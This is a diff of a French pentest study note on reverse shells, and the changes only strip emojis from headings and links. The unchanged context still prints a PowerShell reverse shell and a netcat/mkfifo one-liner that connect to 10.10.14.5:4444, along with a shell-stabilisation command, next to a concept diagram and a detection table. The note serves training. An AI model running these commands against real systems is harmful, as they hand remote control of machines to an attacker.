@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🕸️ Reverse Shells
+# Reverse Shells
 
 > [!info] **En 1 phrase**
 > Reverse shell = le serveur/la machine compromise se connecte **vers nous** pour nous donner
@@ -20,7 +20,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 sequenceDiagram
@@ -32,14 +32,14 @@ sequenceDiagram
     Note over A,C: 3. Shell interactif sur la cible
 ```
 
-> [!info] 💡 **Reverse vs Bind**
+> [!info] **Reverse vs Bind**
 > - **Reverse** : la cible se connecte **à nous** → franchise les FW sortants.
 > - **Bind** : on se connecte **à la cible** → bloque par les FW entrants.
 > En pratique : **reverse** quasi toujours.
 
 ---
 
-## 🛠️ Exploitation
+## Exploitation
 
 ```bash
 # LISTENER (toujours avant !)
@@ -63,7 +63,7 @@ $c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -73,9 +73,9 @@ $c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Stabiliser le shell (Linux)**
+> [!tip] **Stabiliser le shell (Linux)**
 > ```bash
 > python3 -c 'import pty; pty.spawn("/bin/bash")'
 > # Ctrl+Z → stty raw -echo; fg → export TERM=xterm
@@ -84,15 +84,15 @@ $c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]
 > ```
 
 
-> [!warning] ⚠️ **Piège** : `nc -e` n'existe pas sur toutes les versions (OpenBSD vs GNU). Le `mkfifo` est l'alternative universelle :
+> [!warning] **Piège** : `nc -e` n'existe pas sur toutes les versions (OpenBSD vs GNU). Le `mkfifo` est l'alternative universelle :
 > ```bash
 > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
 > ```
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[Pivoting et Tunneling|🌉 Pivoting / Tunneling]]
-- → Note complète : [[04 - Exploitation Réseau|💥 Exploitation Réseau]]
+- [[Injection de commandes| Injection de commandes]]
+- [[Pivoting et Tunneling| Pivoting / Tunneling]]
+- → Note complète : [[04 - Exploitation Réseau| Exploitation Réseau]]
